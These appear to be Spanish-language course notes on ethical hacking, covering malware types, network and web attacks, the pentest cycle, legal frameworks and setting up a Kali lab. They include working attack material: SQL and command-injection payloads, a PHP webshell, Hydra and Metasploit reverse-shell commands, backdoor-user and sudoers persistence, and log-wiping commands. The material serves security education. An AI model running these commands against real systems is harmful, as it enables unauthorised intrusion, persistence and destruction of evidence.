## Malware

|Tipo|Definición|Características clave|Famosos|
|---|---|---|---|
|**Virus**|Se adjunta a un archivo legítimo, necesita ejecución del usuario|Necesita host, requiere acción humana, se replica al ejecutarse|ILOVEYOU (2000, 50M PCs), Melissa (1999)|
|**Worm (gusano)**|Autorreplicante, se propaga sin intervención humana|No necesita host, explota vulnerabilidades de red, consume ancho de banda|Morris Worm (1988), Conficker (2008), WannaCry (2017)|
|**Trojan (troyano)**|Disfrazado de software legítimo|Backdoor / Banking / Downloader / RAT|Zeus/Zbot, Emotet, DarkComet RAT|
|**Ransomware**|Cifra archivos y exige rescate|Crypto / Locker / Scareware / Doxware-Leakware / RaaS|WannaCry, Petya/NotPetya, Ryuk, REvil, LockBit|
|**Spyware**|Recopila información sin consentimiento|Keylogger, screen recorder, banking spyware, mobile spyware|Pegasus (NSO Group)|
|**Adware**|Muestra anuncios no deseados|Pop-ups, cambia página de inicio, ralentiza el sistema; suele venir con spyware|—|
|**Rootkit**|Se oculta en el SO para evadir detección y mantener acceso|Niveles: aplicación → kernel (el más peligroso en uso común) → bootloader → hardware (casi indetectable). Oculta procesos/archivos/tráfico, modifica `ls`/`ps`/`netstat`|Sony BMG Rootkit (2005), Stuxnet|
|**Botnet**|Red de dispositivos infectados controlados remotamente vía C&C|DDoS, spam, minería de criptomonedas, robo de datos, proxy malicioso|Mirai (2016), Zeus (3.6M PCs), Emotet|

**Prevención general de ransomware:** backups regulares offline, sistemas actualizados, no abrir adjuntos sospechosos, antivirus al día, segmentación de red.

---

## Ataques de Red

### Phishing (resumen — detalle completo en Parte 3)

Tipos: email phishing, spear phishing (dirigido), whaling (ejecutivos), smishing (SMS), vishing (llamadas).

### Man-in-the-Middle (MITM)

El atacante se sitúa entre dos partes y puede ver/modificar el tráfico.

|Variante|Mecanismo|
|---|---|
|**ARP Spoofing**|Envía ARP falsos, se hace pasar por el gateway, todo el tráfico pasa por él|
|**DNS Spoofing**|Responde con una IP falsa a una consulta DNS, redirige a sitio malicioso|
|**Session Hijacking**|Roba la cookie de sesión tras el login legítimo y la reutiliza|

Herramientas: Ettercap, Bettercap, mitmproxy. Prevención: HTTPS, VPN, verificar certificados, evitar WiFi público.

### Denial of Service (DoS/DDoS)

DoS = un atacante → víctima. DDoS = múltiples atacantes (botnet) → víctima.

|Categoría|Técnicas|Notas|
|---|---|---|
|Volumétricos|UDP Flood, ICMP Flood, amplification (DNS/NTP)|DNS Amplification: consulta pequeña con IP spoofed → respuesta grande a la víctima (amplificación 50-100x)|
|Protocolares (capa 3-4)|SYN Flood, Ping of Death, Smurf Attack|SYN Flood: miles de SYN sin completar el ACK → tabla de conexiones saturada|
|Aplicación (capa 7)|HTTP Flood, Slowloris, DNS Query Flood|Más difícil de filtrar por parecerse a tráfico legítimo|

Famosos: GitHub 2018 (1.35 Tbps, Memcached amplification), Dyn DNS 2016 (Mirai), Estonia 2007. Prevención: CDN (Cloudflare/Akamai), rate limiting, reglas de firewall, anycast routing.

### SQL Injection (SQLi)

```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
// Ataque: username = admin' OR '1'='1  →  condición siempre TRUE, bypass de login
```

|Tipo|Descripción|
|---|---|
|In-band|Respuesta visible en la misma conexión|
|Blind|Sin respuesta visible, se infiere con TRUE/FALSE|
|Time-based|Se mide el tiempo de respuesta|
|Out-of-band|Respuesta por otro canal (ej. DNS)|

**Prevención:** prepared statements / parametrized queries, validación de input, mínimo privilegio del usuario de BD, WAF.

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

### Cross-Site Scripting (XSS)

|Tipo|Mecanismo|
|---|---|
|**Reflected** (no persistente)|Payload en la URL, requiere que la víctima haga clic|
|**Stored** (persistente)|Payload guardado en BD (ej. un comentario), afecta a todo el que lo vea — más peligroso|
|**DOM-based**|El propio JS manipula el DOM de forma insegura|

Impacto: robo de cookies de sesión, secuestro de cuentas, redirección maliciosa, keylogging en página, defacement. Prevención: sanitizar inputs, escapar outputs, Content Security Policy (CSP), flag `HttpOnly` en cookies.

### Cross-Site Request Forgery (CSRF)

Fuerza a un usuario ya autenticado a ejecutar una acción no deseada (ej. `<img src="https://banco.com/transferir?a=atacante&monto=1000">` cargado en un sitio malicioso, aprovechando la cookie de sesión activa). Prevención: CSRF tokens, atributo `SameSite` en cookies, verificar `Referer`, re-autenticación para acciones críticas.

### Remote Code Execution (RCE)

Causas: deserialización insegura, inyección de comandos, buffer overflow, vulnerabilidades de framework.

```bash
ping -c 4 $USER_INPUT
# Ataque: 127.0.0.1; cat /etc/passwd
```

Impacto: control total del servidor, backdoors, robo de BD, pivoting a otros sistemas.

### Zero-Day Exploits

Vulnerabilidad desconocida por el fabricante, explotada antes de que exista parche.

|Objetivo|Valor de mercado negro aprox.|
|---|---|
|iOS RCE|$2-3M|
|Android RCE|$1-2M|
|Windows RCE|$500K-1M|
|Chrome RCE|$500K|

Famosos: EternalBlue (WannaCry/NotPetya), Log4Shell (2021), múltiples zero-days de Pegasus en iOS.

### Password Attacks

|Técnica|Mecanismo|
|---|---|
|**Brute Force**|Prueba todas las combinaciones posibles|
|**Dictionary Attack**|Prueba palabras de diccionario + variaciones|
|**Rainbow Tables**|Tabla precomputada de hashes → contraseña. Mitigado con salt|
|**Credential Stuffing**|Reutiliza credenciales filtradas de una brecha en otros servicios|

Herramientas: John the Ripper, Hashcat, Hydra, Medusa.

### Social Engineering

|Técnica|Ejemplo|
|---|---|
|**Pretexting**|Crear un escenario falso convincente ("Soy de TI, necesito tu contraseña")|
|**Baiting**|Dejar un USB con malware en un lugar visible, a la espera de que alguien lo conecte|
|**Tailgating/Piggybacking**|Seguir a un empleado autorizado por una puerta segura|
|**Quid Pro Quo**|Ofrecer algo a cambio de información ("Tu premio está en este link")|

Defensa: capacitación de empleados, cultura de seguridad, verificación de identidad, políticas claras.

---

# El Ciclo del Pentesting

## Las 5 Fases

```
1. Reconnaissance (Reconocimiento)
2. Scanning (Escaneo)
3. Gaining Access (Obtener Acceso)
4. Maintaining Access (Mantener Acceso)
5. Covering Tracks (Borrar Huellas)
```

## 1. Reconnaissance

### Passive (sin interacción directa, difícil de detectar, legal — información pública)

```bash
whois ejemplo.com          # registrante, DNS, fecha de creación, contacto
```

Otras técnicas: Google Dorking, DNS records, redes sociales (LinkedIn/Facebook), ofertas de empleo (tecnologías usadas), Shodan, Wayback Machine, metadata de documentos.

```
site:ejemplo.com filetype:pdf
site:ejemplo.com inurl:admin
intitle:"index of" "passwords.txt"
inurl:wp-admin site:ejemplo.com
```

### Active (interacción directa, más detalle, puede detectarse)

```bash
ping ejemplo.com
nslookup ejemplo.com
traceroute ejemplo.com
```

Otras: port scanning (Nmap), banner grabbing, ping sweep, DNS/SNMP enumeration.

## 2. Scanning

**Estados de puerto:** open (servicio escuchando), closed (sin servicio), filtered (bloqueado por firewall).

|Técnica|Mecanismo|Notas|
|---|---|---|
|TCP Connect Scan|Completa el 3-way handshake (SYN→SYN-ACK→ACK)|Preciso pero ruidoso, deja logs|
|SYN Scan (stealth)|SYN→SYN-ACK→RST, no completa la conexión|Más sigiloso, menos logs|
|UDP Scan|Más lento|Necesario para DNS/SNMP/DHCP|

```bash
nmap 192.168.1.1                 # básico
nmap -F 192.168.1.1              # puertos comunes
nmap -p- 192.168.1.1             # todos los puertos
nmap -sV 192.168.1.1             # detectar versiones
nmap -O 192.168.1.1              # detectar SO
nmap -sC 192.168.1.1             # scripts de enumeración
nmap -A 192.168.1.1              # agresivo (todo)
nmap -sS -T2 -f 192.168.1.1      # evadir detección
```

**Vulnerability scanning:** Nessus (comercial), OpenVAS (open source), Nikto (web), Burp Suite (web app).

```bash
nikto -h http://ejemplo.com
dirb http://ejemplo.com /usr/share/wordlists/dirb/common.txt
```

## 3. Gaining Access

```bash
# Exploit conocido
searchsploit apache 2.4.49

# Metasploit
msfconsole
search apache
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.1.100
exploit

# Password cracking
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Otros métodos: social engineering (phishing con payload, USB drop, pretexting), ataques web (SQLi, XSS, file upload, LFI/RFI).

## 4. Maintaining Access

```bash
# Usuario backdoor
useradd -m -s /bin/bash backdoor
echo 'backdoor:password123' | chpasswd
echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Clave SSH propia
echo 'tu_clave_publica' >> ~/.ssh/authorized_keys
ssh -i tu_clave_privada user@victim

# Persistencia programada
echo '*/5 * * * * /tmp/reverse_shell.sh' | crontab -
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onstart
```

Webshell básica: `<?php system($_GET['cmd']); ?>` → `http://victim.com/shell.php?cmd=whoami`

## 5. Covering Tracks

En pentesting legítimo se documenta TODO; borrar huellas es propio del hacking criminal — se incluye aquí solo como referencia de lo que un atacante real haría.

```bash
# Limpiar logs (Linux)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c

# Limpiar logs (Windows)
wevtutil cl System
wevtutil cl Security

# Eliminar archivos de forma segura
shred -vfz -n 10 archivo.txt

# Modificar timestamps
touch -t 202301010000 archivo.txt
```

---

## Metodologías de Pentesting

|Metodología|Enfoque|
|---|---|
|**PTES**|Pre-engagement → Intelligence Gathering → Threat Modeling → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting|
|**OWASP Testing Guide**|Específica para aplicaciones web: info gathering, config, identidad, autenticación/autorización, sesiones, validación de input, criptografía, lógica de negocio, cliente|
|**OSSTMM**|Metodología completa y científica de testing de seguridad|
|**NIST SP 800-115**|Guía del gobierno de EE.UU. para pentesting|

---

# Ética Hacker y Marco Legal

## Código de Ética

|Principio|En la práctica|
|---|---|
|**Permiso explícito**|Nunca hackear sin autorización por escrito; contrato firmado, scope definido, fechas de inicio/fin|
|**Confidencialidad**|No compartir vulnerabilidades ni detalles del cliente; NDA, cifrar reportes, borrar datos tras el engagement|
|**No hacer daño**|Evitar DoS en producción, no borrar datos, no exfiltrar info sensible real, testear en horarios acordados, tener plan de rollback|
|**Reporte completo**|Documentar todo hallazgo con evidencia y pasos de reproducción|
|**Divulgación responsable**|Reportar vulnerabilidades al vendor antes que publicarlas|

**Scope (alcance):** define qué sistemas se pueden testear, cuáles están fuera de límites, qué técnicas están permitidas, cuándo se puede testear y a quién se reporta. Ejemplo típico de out-of-scope: sistemas de producción de pagos, BD de clientes reales, DoS/DDoS, social engineering a empleados sin autorización específica.

**Demostrar impacto sin causar daño:** ante una SQLi con capacidad de `DELETE`, se usa `SELECT COUNT(*) FROM users;` para demostrar acceso, nunca `DROP TABLE`.

### Estructura de un reporte

1. Executive Summary (para no técnicos)
2. Scope (qué se testeó)
3. Metodología (PTES, OWASP, etc.)
4. Hallazgos: vulnerabilidad, severidad, evidencia, pasos de reproducción, impacto
5. Recomendaciones de remediación, priorizadas
6. Conclusión

**Severidad:** 🔴 Crítico (RCE, SQLi con acceso a BD) · 🟠 Alto (XSS stored, CSRF crítico) · 🟡 Medio (XSS reflected, info sensible) · 🟢 Bajo (falta de headers, info menor).

### Divulgación responsable

```
Encontrar vulnerabilidad → NO publicar → contactar al vendor
(security@empresa.com / bug bounty) → dar tiempo razonable para
parchear (típicamente 90 días) → seguimiento → publicación
coordinada (opcional)
```

Contraste: reportar por el canal correcto y esperar parche (bueno) vs. publicar de inmediato en redes ("full disclosure"), exponiendo a los usuarios antes del parche (malo).

---

## Marco Legal por País/Región

|Jurisdicción|Ley|Notas|
|---|---|---|
|**EE.UU.**|Computer Fraud and Abuse Act (CFAA, 1986)|Prohíbe acceso no autorizado, exceder acceso autorizado, transmitir código dañino, tráfico de contraseñas. Hasta 20 años de prisión. Casos: Aaron Swartz (2011), Robert Morris (1988)|
|**Unión Europea**|GDPR|Protección de datos personales; multas hasta 20M€ o 4% de facturación global|
|**Unión Europea**|NIS Directive|Ciberseguridad de infraestructura crítica, reporte obligatorio de incidentes|
|**Reino Unido**|Computer Misuse Act (1990)|Acceso no autorizado, acceso con intención criminal, modificación no autorizada. Hasta 10 años de prisión|
|**Colombia**|Ley 1273 de 2009|Crea el bien jurídico "Protección de la Información y los Datos". Penas de 48-96 meses para acceso abusivo, obstaculización de sistema, interceptación de datos, daño informático, malware, violación de datos personales, suplantación de sitios web|

**Jurisdicción internacional:** cuando atacante, servidor y víctima están en países distintos, la ley aplicable no siempre es clara. La **Budapest Convention on Cybercrime (2001)** es el primer tratado internacional sobre cibercrimen, con 68+ países firmantes, y facilita la cooperación entre jurisdicciones.

## Consecuencias del hacking ilegal

- **Penales:** prisión, multas, antecedentes, extradición, prohibición de uso de computadoras.
- **Civiles:** demandas por daños, compensación a víctimas, pérdida de licencias profesionales.
- **Personales:** carrera destruida, reputación arruinada, dificultad para emplearse, restricciones de viaje.

## Cómo hackear legalmente

|Vía|Detalle|
|---|---|
|**Bug Bounty**|HackerOne, Bugcrowd, Synack, Intigriti, YesWeHack — scope claro, reglas y recompensas|
|**CTF**|HackTheBox, TryHackMe, PentesterLab, OverTheWire, SANS Holiday Hack Challenge|
|**Pentesting profesional**|Contrato firmado con el cliente antes de testear|
|**Laboratorios propios**|Red propia, VMs, DVWA/Metasploitable, whoami-labs|

---

# Setup del Laboratorio de Pentesting

## Requisitos de hardware

```
||Mínimo|Recomendado|
|---|---|---|
|CPU|Dual-core|Quad-core o mejor|
|RAM|8 GB|16 GB|
|Disco|50 GB libres|100+ GB (SSD)|
|Virtualización|VT-x/AMD-V habilitada|—|
```

## Hypervisor

- **VirtualBox** (gratis, open source, multiplataforma) — virtualbox.org
- **VMware Workstation/Fusion** (más rápido, mejor integración; VMware Player gratis para uso personal)

## Instalar Kali Linux en VirtualBox

```
1. kali.org/get-kali → descargar "Virtual Machines" → VirtualBox 64-bit (.7z)
2. Extraer (7-Zip / `7z x archivo.7z`) → obtiene el .vdi
3. VirtualBox → Importar → seleccionar .ova/.vdi
   → RAM 2-4 GB, 2 CPU cores, red NAT o Bridge → Importar
4. Iniciar (usuario: kali / contraseña: kali)
```

```bash
# Configuración inicial
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y vim git curl wget netcat
passwd                    # cambiar contraseña
setxkbmap es               # teclado en español, si hace falta
```

## Herramientas preinstaladas por categoría

|Categoría|Herramientas|
|---|---|
|Information Gathering|Nmap, Recon-ng, theHarvester, Maltego, Shodan|
|Vulnerability Analysis|Nikto, OpenVAS, SQLmap, WPScan|
|Exploitation|Metasploit Framework, SearchSploit, BeEF|
|Password Attacks|John the Ripper, Hashcat, Hydra, CrackMapExec|
|Wireless Attacks|Aircrack-ng, Reaver, Wifite|
|Web Applications|Burp Suite, OWASP ZAP, Gobuster, ffuf|

---

## Labs de Práctica

### Reconocimiento activo con Nmap (red 192.168.1.0/24)

```bash
ping 192.168.1.1
nmap -sn 192.168.1.0/24                    # descubrir hosts activos
nmap 192.168.1.100                          # puertos del host
nmap -sV -sC -p- 192.168.1.100              # escaneo detallado
nmap -sV -sC -oA escaneo_inicial 192.168.1.100   # guardar resultado
```

Lectura de resultado — SSH abierto sugiere revisar fuerza bruta; servidor web sugiere buscar vulns web; MySQL expuesto externamente es una señal de alerta.

### Reconocimiento pasivo (OSINT)

```bash
whois whoami-labs.com
nslookup whoami-labs.com
dig whoami-labs.com ANY
sublist3r -d whoami-labs.com

# Google Dorking
site:whoami-labs.com
site:whoami-labs.com filetype:pdf
site:whoami-labs.com inurl:admin

# Wayback Machine: web.archive.org/web/*/whoami-labs.com
# Shodan: shodan search hostname:whoami-labs.com
```

Documentar: servidores DNS, subdominios, tecnologías detectadas, contactos, archivos interesantes.

### Uso básico de Metasploit

```bash
msfconsole
search apache
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit

meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

⚠️ Solo practicar en VMs propias, HackTheBox/TryHackMe o whoami-labs.

## Máquinas vulnerables para practicar

**Nivel principiante:** DVWA, WebGoat, Metasploitable 2/3.

**Plataformas online:** HackTheBox (máquinas + CTFs + certificaciones), TryHackMe (más guiado, learning paths), whoami-labs (labs del curso, ranking, recursos en español).